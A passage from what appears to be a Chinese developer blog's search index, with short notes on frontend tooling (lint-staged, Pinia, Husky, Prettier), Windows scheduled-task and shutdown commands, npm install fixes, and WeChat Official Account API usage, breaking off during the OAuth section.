&#39;A0Zr98j/3yX R~XHH!jmN]LWX/,?RT&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lint-staged</title>
      <link href="/2024/09/15/frontend-npm-lintstaged/"/>
      <url>/2024/09/15/frontend-npm-lintstaged/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目工程依赖lint-staged，用来配合eslint使用，只检测git仓库暂存区的内容。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装到开发环境"><a href="#安装到开发环境" class="headerlink" title="安装到开发环境"></a>安装到开发环境</h3><pre><code class="bash">npm install -D lint-staged@12.5.0</code></pre><h3 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h3><pre><code class="javascript">&#123;    &quot;devDependencies&quot;: &#123;        &quot;lint-staged&quot;: &quot;^12.5.0&quot;    &#125;&#125;</code></pre><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><pre><code class="javascript">&#123;    &quot;scripts&quot;: &#123;        &quot;lint-staged&quot;: &quot;lint-staged&quot;    &#125;,&#125;</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><pre><code class="javascript">&#123;    &quot;lint-staged&quot;: &#123;        &quot;*.&#123;js, jsx, vue&#125;&quot;: [            &quot;eslint --color&quot;        ]    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lint-staged </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pinia</title>
      <link href="/2024/09/15/frontend-npm-pinia/"/>
      <url>/2024/09/15/frontend-npm-pinia/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目工程依赖Pinia，一个拥有组合式 API 的 Vue 状态管理库。</p></blockquote><h2 id="什么是Store"><a href="#什么是Store" class="headerlink" title="什么是Store"></a>什么是Store</h2><p>一个 Store （如 Pinia）是一个实体，它持有未绑定到您的组件树的状态和业务逻辑。换句话说，它托管全局状态。它有点像一个始终存在并且每个人都可以读取和写入的组件。它有三个概念，state、getters 和 actions 并且可以安全地假设这些概念等同于组件中的“数据”、“计算”和“方法”。</p><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p><a href="https://pinia.web3doc.top/getting-started.html">Pinia中文文档</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="bash">npm install pinia@2.1.6 </code></pre><h2 id="pinia使用"><a href="#pinia使用" class="headerlink" title="pinia使用"></a>pinia使用</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>main.js</p><pre><code class="javascript">import &#123; createPinia &#125; from &#39;pinia&#39;...const pinia = createPinia()app.use(pinia)...</code></pre><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>stores&#x2F;index.js</p><pre><code class="javascript">import &#123; defineStore &#125; from &#39;pinia&#39;export const braveMainStore = defineStore(&#123;    id: &#39;templateId&#39;,    state: () =&gt; (&#123;        counter: 1,    &#125;),    getters: &#123;        doubleCount: state =&gt; state.counter * 2    &#125;,    actions: &#123;        increment() &#123;            this.counter++        &#125;,        randomizeCounter() &#123;            this.counter += Math.round(100 * Math.random())        &#125;,    &#125;&#125;)</code></pre><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><pre><code class="javascript">import &#123; braveMainStore &#125; from &#39;@stores&#39;const main = useMainStore()console.log(main.counter)console.log(main.doubleCount)main.randomizeCounter()console.log(main.counter)</code></pre><h2 id="缓存数据"><a href="#缓存数据" class="headerlink" title="缓存数据"></a>缓存数据</h2><h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><pre><code class="bash">npm install pinia-plugin-persistedstate@3.2.0</code></pre><h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><pre><code class="javascript">import piniaPluginPersistedstate from &#39;pinia-plugin-persistedstate&#39;...pinia.use(piniaPluginPersistedstate)...</code></pre><h3 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h3><pre><code class="javascript">export const braveMainStore = defineStore(&#123;    persist: true,&#125;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pinia </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Husky</title>
      <link href="/2024/09/15/frontend-npm-husky/"/>
      <url>/2024/09/15/frontend-npm-husky/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目工程依赖Husky，配置后可在git commit前进行前置处理，可以用来配合eslint进行前置校验，提升项目组整体代码格式规范。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装到开发环境"><a href="#安装到开发环境" class="headerlink" title="安装到开发环境"></a>安装到开发环境</h3><pre><code class="bash">npm install -D husky@8.0.3</code></pre><h3 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h3><pre><code class="javascript">&#123;    &quot;devDependencies&quot;: &#123;        &quot;husky&quot;: &quot;^8.0.3&quot;,    &#125;&#125;</code></pre><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><pre><code class="javascript">&#123;    &quot;scripts&quot;: &#123;        &quot;husky-init&quot;: &quot;husky install&quot;,        &quot;husky-add&quot;: &quot;husky add .husky/pre-commit&quot;,    &#125;,&#125;</code></pre><h2 id="pre-commit"><a href="#pre-commit" class="headerlink" title="pre-commit"></a>pre-commit</h2><p>注意：husky使用前必须先初始化git仓库，然后再依次初始新增husky文件</p><pre><code class="shell">#!/usr/bin/env sh. &quot;$(dirname -- &quot;$0&quot;)/_/husky.sh&quot;npm run eslint</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Husky </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prettier</title>
      <link href="/2024/09/15/frontend-npm-prettier/"/>
      <url>/2024/09/15/frontend-npm-prettier/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目工程依赖Prettier，前端代码格式化工具，它可以支持JS&#x2F;JSX&#x2F;TS&#x2F;Flow&#x2F;JSON&#x2F;CSS&#x2F;LESS等文件格式</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装到开发环境"><a href="#安装到开发环境" class="headerlink" title="安装到开发环境"></a>安装到开发环境</h3><pre><code class="bash">npm install -D prettier@2.8.8</code></pre><h3 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h3><pre><code class="javascript">&#123;    &quot;devDependencies&quot;: &#123;        &quot;prettier&quot;: &quot;^2.8.8&quot;,        &quot;eslint-config-prettier&quot;: &quot;^9.1.0&quot;,        &quot;eslint-plugin-prettier&quot;: &quot;^4.2.1&quot;    &#125;&#125;</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置规则文件"><a href="#配置规则文件" class="headerlink" title="配置规则文件"></a>配置规则文件</h3><p>.prettierrc.json</p><pre><code class="json">&#123;    &quot;printWidth&quot;: 120, // 定义每行代码的最大字符数。超过这个限制的行将被自动换行。此处设置为 120，即每行最多可以有 120 个字符。    &quot;tabWidth&quot;: 4, // 设置制表符（tab）所占的空格数。此处为 4，意味着一个制表符的宽度等于 4 个空格。    &quot;useTabs&quot;: false, // 指定是否使用制表符代替空格进行缩进。false 表示使用空格。    &quot;semi&quot;: false, // 控制语句末尾是否使用分号。false 表示不使用分号，所有语句末尾都将省略分号。    &quot;vueIndentScriptAndStyle&quot;: false, // 当格式化 Vue 文件时，是否缩进 &lt;script&gt; 和 &lt;style&gt; 标签内的内容。true 表示启用缩进。    &quot;singleQuote&quot;: true, // 设置是否使用单引号（&#39;）而不是双引号（&quot;）。true 表示使用单引号。    &quot;quoteProps&quot;: &quot;as-needed&quot;, // 定义在对象字面量中如何处理属性名的引号。as-needed 表示仅在必要时使用引号（如属性名包含空格或特殊字符时）。    &quot;bracketSpacing&quot;: true, // 控制对象字面量中大括号之间的空格。true 表示 &#123; foo: bar &#125; 的形式，而 false 则为 &#123;foo: bar&#125;。    &quot;trailingComma&quot;: &quot;none&quot;, // 控制对象、数组等结构末尾是否添加逗号。es5 表示在可以的情况下添加尾随逗号（如对象字面量、数组等），但不会在函数参数中添加。    &quot;jsxBracketSameLine&quot;: false, // 控制 JSX 元素的闭合括号是否与最后一行内容在同一行。false 表示闭合括号会独占一行。    &quot;jsxSingleQuote&quot;: true, // 指定在 JSX 中是否使用单引号。false 表示使用双引号。    &quot;arrowParens&quot;: &quot;always&quot;, // 控制箭头函数参数是否需要括号。always 表示即使只有一个参数也要使用括号，例如 (param) =&gt; &#123;&#125;。    &quot;insertPragma&quot;: false, // 控制是否在格式化的文件顶部插入一个特殊的注释。false 表示不插入。    &quot;requirePragma&quot;: false, // 控制是否仅格式化包含特定注释的文件。false 表示不要求注释。    &quot;proseWrap&quot;: &quot;always&quot;, // 设置如何处理文本块的换行。never 表示不进行换行。    &quot;htmlWhitespaceSensitivity&quot;: &quot;css&quot;, // 控制 HTML 中的空白字符敏感度。strict 表示严格遵循 HTML 规范。    &quot;endOfLine&quot;: &quot;auto&quot;, // 定义行尾字符的处理方式。lf 仅换行;crlf 回车符 + 换行符;cr 仅回车符;auto 维护现有的行尾    &quot;rangeStart&quot;: 0, // 设置格式化的起始字符位置。0 表示从文件的开始位置开始格式化。    &quot;ignorePath&quot;: &quot;.prettierignore&quot;, // 格式化忽略文件    &quot;singleAttributePerLine&quot;: false, // 在 HTML、Vue 和 JSX 中每行强制使用单个属性    &quot;bracketSameLine&quot;: false, // 在对象文本的方括号之间打印空格    &quot;embeddedLanguageFormatting&quot;: &quot;auto&quot;, // 控制是否自动格式化嵌入的语言（如Markdown中的代码块）。其值设置为&quot;auto&quot;，表示Prettier将尝试自动格式化嵌入的语言。    &quot;experimentalTernaries&quot;: false, // true: 三元符在条件后加上问号/false: 不限制&#125;</code></pre><h3 id="忽略规则文件"><a href="#忽略规则文件" class="headerlink" title="忽略规则文件"></a>忽略规则文件</h3><p>.prettierignore</p><pre><code>build.cache# Ignore all HTML files:*.html*.yml*.yaml</code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="解决和eslint冲突"><a href="#解决和eslint冲突" class="headerlink" title="解决和eslint冲突"></a>解决和eslint冲突</h3><ol><li>安装 eslint-config-prettier 插件 (关闭与prettier冲突的eslint规则)</li></ol><pre><code class="bash">npm install -D eslint-config-prettier@9.1.0</code></pre><ol start="2"><li>在eslint的配置文件中写入以下内容</li></ol><pre><code class="javascript">extends: [&#39;plugin:prettier/recommended&#39;],</code></pre><h3 id="将Prettier作为ESLint规则运行"><a href="#将Prettier作为ESLint规则运行" class="headerlink" title="将Prettier作为ESLint规则运行"></a>将Prettier作为ESLint规则运行</h3><ol><li>安装 eslint-plugin-prettier 插件</li></ol><pre><code class="bash">npm install -D eslint-plugin-prettier@4.2.1</code></pre><ol start="2"><li>在eslint的配置文件中写入以下内容</li></ol><pre><code class="javascript">eslintPluginPrettierRecommended: () =&gt; import(&#39;eslint-plugin-prettier/recommended&#39;),</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Prettier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win-Bat</title>
      <link href="/2024/08/30/win-bat/"/>
      <url>/2024/08/30/win-bat/</url>
      
        <content type="html"><![CDATA[<p>记录学习一些Windows系统下用到的命令</p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><h3 id="定时执行脚本"><a href="#定时执行脚本" class="headerlink" title="定时执行脚本"></a>定时执行脚本</h3><pre><code class="shell"># 每天17:32执行test脚本schtasks /create /tn login_task /tr C:\Users\15703\Desktop\login.bat /sc DAILY /st 17:32:00</code></pre><h3 id="定时循环间断执行脚本"><a href="#定时循环间断执行脚本" class="headerlink" title="定时循环间断执行脚本"></a>定时循环间断执行脚本</h3><pre><code class="shell"># 当天8:00到21:00每隔2分钟执行test脚本schtasks /create /tn login_task /tr D:\test.bat /sc minute /mo 2 /st 08:00:00 /et 21:00:00</code></pre><h3 id="开机启动脚本"><a href="#开机启动脚本" class="headerlink" title="开机启动脚本"></a>开机启动脚本</h3><pre><code class="shell">schtasks.exe /create /tn &quot;restart&quot; /ru SYSTEM /sc ONSTART /tr &quot;E:\dataojo\commond\restart.bat&quot;</code></pre><h3 id="查看已配置定时任务"><a href="#查看已配置定时任务" class="headerlink" title="查看已配置定时任务"></a>查看已配置定时任务</h3><pre><code class="shell">schtasks /query /tn login_task</code></pre><h3 id="结束任务"><a href="#结束任务" class="headerlink" title="结束任务"></a>结束任务</h3><pre><code class="shell">schtasks /end /tn login_task</code></pre><h3 id="删除任务"><a href="#删除任务" class="headerlink" title="删除任务"></a>删除任务</h3><pre><code class="shell">schtasks /delete /tn login_task /f</code></pre><h3 id="运行任务"><a href="#运行任务" class="headerlink" title="运行任务"></a>运行任务</h3><pre><code class="shell">schtasks /run /tn send_msg_task</code></pre><h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><h3 id="200秒后关机"><a href="#200秒后关机" class="headerlink" title="200秒后关机"></a>200秒后关机</h3><pre><code class="shell">shutdown -s -t 200</code></pre><h3 id="取消关机计划任务"><a href="#取消关机计划任务" class="headerlink" title="取消关机计划任务"></a>取消关机计划任务</h3><pre><code class="shell">shutdown -a</code></pre>]]></content>
      
      
      <categories>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugs</title>
      <link href="/2024/08/15/frontend-bugsmemos/"/>
      <url>/2024/08/15/frontend-bugsmemos/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目开发过程中碰到的有意思的问题记录，持续更新…</p></blockquote><h2 id="项目安装依赖"><a href="#项目安装依赖" class="headerlink" title="项目安装依赖"></a>项目安装依赖</h2><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><ol><li>问题描述<blockquote><p>历史项目需要迭代更新，在安装依赖时报错，换源换node版本均无效</p></blockquote></li><li>报错内容</li></ol><pre><code class="shell">git .EXE ls-remote -h -t ssh://git@github.com/************.git</code></pre><ol start="3"><li>解决方案</li></ol><pre><code class="shell"># 全局配置 将使用到的依赖仓库的地址git更改为httpsgit config --global url.&quot;https://&quot;.insteadOf git://npm cache clean --forcenpm config set registry https://registry.npmmirror.com/npm install# 恢复npm包地址npm config set registry https://registry.npmjs.org/</code></pre><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li>问题描述<blockquote></blockquote></li><li>报错内容</li></ol><pre><code></code></pre><ol start="3"><li>解决方案</li></ol><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信公众号-H5</title>
      <link href="/2024/08/15/wechat-h5/"/>
      <url>/2024/08/15/wechat-h5/</url>
      
        <content type="html"><![CDATA[<p>为了识别用户，每个用户针对每个公众号会产生一个安全的OpenID，如果需要在多公众号、移动应用之间做用户共通，则需前往微信开放平台，将这些公众号和应用绑定到一个开放平台账号下，绑定后，一个用户虽然对多个公众号和应用有多个不同的OpenID，但他对所有这些同一开放平台账号下的公众号和应用，只有一个UnionID，可以在用户管理-获取用户基本信息（UnionID机制）文档了解详情。</p><h2 id="公众号后台配置"><a href="#公众号后台配置" class="headerlink" title="公众号后台配置"></a>公众号后台配置</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><blockquote><p>登录微信公众平台官网后，在公众平台官网的开发-基本设置页面，勾选协议成为开发者，点击“修改配置”按钮，填写服务器地址（URL）、Token和EncodingAESKey，其中URL是开发者用来接收微信消息和事件的接口URL。Token可由开发者可以任意填写，用作生成签名（该Token会和接口URL中包含的Token进行比对，从而验证安全性）。EncodingAESKey由开发者手动填写或随机生成，将用作消息体加解密密钥。</p></blockquote><h3 id="验证示例"><a href="#验证示例" class="headerlink" title="验证示例"></a>验证示例</h3><pre><code class="php">private function checkSignature()&#123;    $signature = $_GET[&quot;signature&quot;];    $timestamp = $_GET[&quot;timestamp&quot;];    $nonce = $_GET[&quot;nonce&quot;];        $token = TOKEN;    $tmpArr = array($token, $timestamp, $nonce);    sort($tmpArr, SORT_STRING);    $tmpStr = implode( $tmpArr );    $tmpStr = sha1( $tmpStr );        if( $tmpStr == $signature )&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;</code></pre><h2 id="获取-Access-token"><a href="#获取-Access-token" class="headerlink" title="获取 Access token"></a>获取 Access token</h2><h3 id="请求地址"><a href="#请求地址" class="headerlink" title="请求地址"></a>请求地址</h3><blockquote><p>GET <a href="https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=APPID&secret=APPSECRET">https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET</a></p></blockquote><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><table><thead><tr><th>参数</th><th>是否必须</th><th>说明</th></tr></thead><tbody><tr><td>grant_type</td><td>是</td><td>获取access_token填写client_credential</td></tr><tr><td>appid</td><td>是</td><td>第三方用户唯一凭证</td></tr><tr><td>secret</td><td>是</td><td>第三方用户唯一凭证密钥，即appsecret</td></tr></tbody></table><h2 id="自定义菜单"><a href="#自定义菜单" class="headerlink" title="自定义菜单"></a>自定义菜单</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>自定义菜单最多包括3个一级菜单，每个一级菜单最多包含5个二级菜单。</li><li>一级菜单最多4个汉字，二级菜单最多8个汉字，多出来的部分将会以“…”代替。</li><li>创建自定义菜单后，菜单的刷新策略是，在用户进入公众号会话页或公众号profile页时，如果发现上一次拉取菜单的请求在5分钟以前，就会拉取一下菜单，如果菜单有更新，就会刷新客户端的菜单。测试时可以尝试取消关注公众账号后再次关注，则可以看到创建后的效果。​</li></ol><h3 id="菜单类型"><a href="#菜单类型" class="headerlink" title="菜单类型"></a>菜单类型</h3><ol><li>click：点击推事件用户点击click类型按钮后，微信服务器会通过消息接口推送消息类型为event的结构给开发者（参考消息接口指南），并且带上按钮中开发者填写的key值，开发者可以通过自定义的key值与用户进行交互；</li><li>view：跳转URL用户点击view类型按钮后，微信客户端将会打开开发者在按钮中填写的网页URL，可与网页授权获取用户基本信息接口结合，获得用户基本信息。</li><li>scancode_push：扫码推事件用户点击按钮后，微信客户端将调起扫一扫工具，完成扫码操作后显示扫描结果（如果是URL，将进入URL），且会将扫码的结果传给开发者，开发者可以下发消息。</li><li>scancode_waitmsg：扫码推事件且弹出“消息接收中”提示框用户点击按钮后，微信客户端将调起扫一扫工具，完成扫码操作后，将扫码的结果传给开发者，同时收起扫一扫工具，然后弹出“消息接收中”提示框，随后可能会收到开发者下发的消息。</li><li>pic_sysphoto：弹出系统拍照发图用户点击按钮后，微信客户端将调起系统相机，完成拍照操作后，会将拍摄的相片发送给开发者，并推送事件给开发者，同时收起系统相机，随后可能会收到开发者下发的消息。</li><li>pic_photo_or_album：弹出拍照或者相册发图用户点击按钮后，微信客户端将弹出选择器供用户选择“拍照”或者“从手机相册选择”。用户选择后即走其他两种流程。</li><li>pic_weixin：弹出微信相册发图器用户点击按钮后，微信客户端将调起微信相册，完成选择操作后，将选择的相片发送给开发者的服务器，并推送事件给开发者，同时收起相册，随后可能会收到开发者下发的消息。</li><li>location_select：弹出地理位置选择器用户点击按钮后，微信客户端将调起地理位置选择工具，完成选择操作后，将选择的地理位置发送给开发者的服务器，同时收起位置选择工具，随后可能会收到开发者下发的消息。</li><li>media_id：下发消息（除文本消息）用户点击media_id类型按钮后，微信服务器会将开发者填写的永久素材id对应的素材下发给用户，永久素材类型可以是图片、音频、视频 、图文消息。请注意：永久素材id必须是在“素材管理&#x2F;新增永久素材”接口上传后获得的合法id。</li><li>article_id：用户点击 article_id 类型按钮后，微信客户端将会以卡片形式，下发开发者在按钮中填写的图文消息</li><li>article_view_limited：类似 view_limited，但不使用 media_id 而使用 article_id</li></ol><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><blockquote><p>POST <a href="https://api.weixin.qq.com/cgi-bin/menu/create?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/menu/create?access_token=ACCESS_TOKEN</a></p></blockquote><pre><code class="javascript"> &#123;     &quot;button&quot;:[     &#123;          &quot;type&quot;:&quot;click&quot;,          &quot;name&quot;:&quot;今日歌曲&quot;,          &quot;key&quot;:&quot;V1001_TODAY_MUSIC&quot;      &#125;,      &#123;           &quot;name&quot;:&quot;菜单&quot;,           &quot;sub_button&quot;:[           &#123;               &quot;type&quot;:&quot;view&quot;,               &quot;name&quot;:&quot;搜索&quot;,               &quot;url&quot;:&quot;http://www.soso.com/&quot;            &#125;,            &#123;                 &quot;type&quot;:&quot;miniprogram&quot;,                 &quot;name&quot;:&quot;wxa&quot;,                 &quot;url&quot;:&quot;http://mp.weixin.qq.com&quot;,                 &quot;appid&quot;:&quot;wx286b93c14bbf93aa&quot;,                 &quot;pagepath&quot;:&quot;pages/lunar/index&quot;             &#125;,            &#123;               &quot;type&quot;:&quot;click&quot;,               &quot;name&quot;:&quot;赞一下我们&quot;,               &quot;key&quot;:&quot;V1001_GOOD&quot;            &#125;]       &#125;] &#125;</code></pre><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><blockquote><p>GET <a href="https://api.weixin.qq.com/cgi-bin/get_current_selfmenu_info?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/get_current_selfmenu_info?access_token=ACCESS_TOKEN</a></p></blockquote><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><blockquote><p>GET <a href="https://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN</a></p></blockquote><h2 id="消息能力"><a href="#消息能力" class="headerlink" title="消息能力"></a>消息能力</h2><h3 id="模板消息"><a href="#模板消息" class="headerlink" title="模板消息"></a>模板消息</h3><ol><li>设置所属行业<blockquote><p> POST <a href="https://api.weixin.qq.com/cgi-bin/template/api_set_industry?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/template/api_set_industry?access_token=ACCESS_TOKEN</a></p></blockquote></li></ol><pre><code class="javascript">// 公众号模板消息所属行业编号设置参数&#123;    &quot;industry_id1&quot;: &quot;1&quot;,    &quot;industry_id2&quot;: &quot;4&quot;&#125;</code></pre><table><thead><tr><th>参数</th><th>是否必须</th><th>说明</th></tr></thead><tbody><tr><td>access_token</td><td>是</td><td>接口调用凭证</td></tr><tr><td>industry_id1</td><td>是</td><td>公众号模板消息所属行业编号</td></tr><tr><td>industry_id2</td><td>是</td><td>公众号模板消息所属行业编号</td></tr><tr><td>2. 获取模板列表</td><td></td><td></td></tr></tbody></table><blockquote><p>GET <a href="https://api.weixin.qq.com/cgi-bin/template/get_all_private_template?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/template/get_all_private_template?access_token=ACCESS_TOKEN</a><br>3. 获取模板id<br>POST <a href="https://api.weixin.qq.com/cgi-bin/template/api_add_template?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/template/api_add_template?access_token=ACCESS_TOKEN</a></p></blockquote><pre><code class="javascript">// 获取模板id&#123;    &quot;template_id_short&quot;: &quot;47123&quot;,    &quot;keyword_name_list&quot;: [&quot;时间&quot;,&quot;地点&quot;,&quot;金额&quot;]&#125;</code></pre><table><thead><tr><th>参数</th><th>是否必须</th><th>说明</th></tr></thead><tbody><tr><td>access_token</td><td>是</td><td>接口调用凭证</td></tr><tr><td>template_id_short</td><td>是</td><td>模板库中模板的编号，有“TM<strong>”和“OPENTMTM</strong>”等形式,对于类目模板，为纯数字ID</td></tr><tr><td>keyword_name_list</td><td>是</td><td>选用的类目模板的关键词,按顺序传入,如果为空，或者关键词不在模板库中，会返回40246错误码</td></tr><tr><td>4. 删除模板</td><td></td><td></td></tr></tbody></table><blockquote><p>POST <a href="https://api.weixin.qq.com/cgi-bin/template/del_private_template?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/template/del_private_template?access_token=ACCESS_TOKEN</a></p></blockquote><pre><code class="javascript">&#123;     &quot;template_id&quot; : &quot;Dyvp3-Ff0cnail_CDSzk1fIc6-9lOkxsQE7exTJbwUE&quot; // 公众账号下模板消息ID, 包括类目模板ID&#125;</code></pre><ol start="5"><li>发送模板消息<blockquote><p>POST <a href="https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN</a></p></blockquote></li></ol><pre><code class="javascript">&#123;     &quot;touser&quot;:&quot;OPENID&quot;,     &quot;template_id&quot;:&quot;ngqIpbwh8bUfcSsECmogfXcV14J0tQlEpBO27izEYtY&quot;,     &quot;url&quot;:&quot;http://weixin.qq.com/download&quot;,       &quot;miniprogram&quot;:&#123;       &quot;appid&quot;:&quot;xiaochengxuappid12345&quot;,       &quot;pagepath&quot;:&quot;index?foo=bar&quot;     &#125;,     &quot;client_msg_id&quot;:&quot;MSG_000001&quot;,     &quot;data&quot;:&#123;             &quot;keyword1&quot;:&#123;                 &quot;value&quot;:&quot;巧克力&quot;             &#125;,             &quot;keyword2&quot;: &#123;                 &quot;value&quot;:&quot;39.8元&quot;             &#125;,             &quot;keyword3&quot;: &#123;                 &quot;value&quot;:&quot;2014年9月22日&quot;             &#125;     &#125;&#125;</code></pre><table><thead><tr><th>参数</th><th>是否必须</th><th>说明</th></tr></thead><tbody><tr><td>touser</td><td>是</td><td>接收者openid</td></tr><tr><td>template_id</td><td>是</td><td>模板ID</td></tr><tr><td>url</td><td>否</td><td>模板跳转链接（海外账号没有跳转能力）</td></tr><tr><td>miniprogram</td><td>否</td><td>跳小程序所需数据，不需跳小程序可不用传该数据</td></tr><tr><td>appid</td><td>是</td><td>所需跳转到的小程序appid（该小程序appid必须与发模板消息的公众号是绑定关联关系，暂不支持小游戏）</td></tr><tr><td>pagepath</td><td>否</td><td>所需跳转到小程序的具体页面路径，支持带参数,（示例index?foo&#x3D;bar），要求该小程序已发布，暂不支持小游戏</td></tr><tr><td>data</td><td>是</td><td>模板数据</td></tr><tr><td>client_msg_id</td><td>否</td><td>防重入id。对于同一个openid + client_msg_id, 只发送一条消息,10分钟有效,超过10分钟不保证效果。若无防重入需求，可不填</td></tr></tbody></table><p>注：url和miniprogram都是非必填字段，若都不传则模板无跳转；若都传，会优先跳转至小程序。开发者可根据实际需要选择其中一种跳转方式即可。当用户的微信客户端版本不支持跳小程序时，将会跳转至url。</p><h2 id="微信网页开发"><a href="#微信网页开发" class="headerlink" title="微信网页开发"></a>微信网页开发</h2><h3 id="网页授权"><a href="#网页授权" class="headerlink" title="网页授权"></a>网页授权</h3><ol><li><p>第一步：用户同意授权，获取code</p><blockquote><p>  在确保微信公众账号拥有授权作用域（scope参数）的权限的前提下（已认证服务号，默认拥有scope参数中的snsapi_base和snsapi_userinfo 权限），引导关注者打开如下页面：<a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&redirect_uri=REDIRECT_URI&response_type=code&scope=SCOPE&state=STATE#wechat_redirect">https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</a><br> 若提示“该链接无法访问”，请检查参数是否填写错误，是否拥有scope参数对应的授权作用域权限。<br> 尤其注意：由于授权操作安全等级较高，所以在发起授权请求时，微信会对授权链接做正则强匹配校验，如果链接的参数顺序不对，授权页面将无法正常访问,<br> 用户同意授权后<br> 如果用户同意授权，页面将跳转至 redirect_uri&#x2F;?code&#x3D;CODE&amp;state&#x3D;STATE。</p></blockquote></li><li><p>第二步：通过code换取网页授权access_token</p><blockquote><p>  首先请注意，这里通过code换取的是一个特殊的网页授权access_token,与基础支持中的access_token（该access_token用于调用其他接口）不同。公众号可通过下述接口来获取网页授权access_token。如果网页授权的作用域为snsapi_base，则本步骤中获取到网页授权access_token的同时，也获取到了openid，snsapi_base式的网页授权流程即到此为止。<br> 尤其注意：由于公众号的secret和获取到的access_token安全级别都非常高，必须只保存在服务器，不允许传给客户端。后续刷新access_token、通过access_token获取用户信息等步骤，也必须从服务器发起<br> <a href="https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&secret=SECRET&code=CODE&grant_type=authorization_code">https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</a></p></blockquote></li><li><p>刷新access_token（如果需要）</p><blockquote><p>  由于access_token拥有较短的有效期，当access_token超时后，可以使用refresh_token进行刷新，refresh_token有效期为30天，当refresh_token失效之后，需要用户重新授权。<br> <a 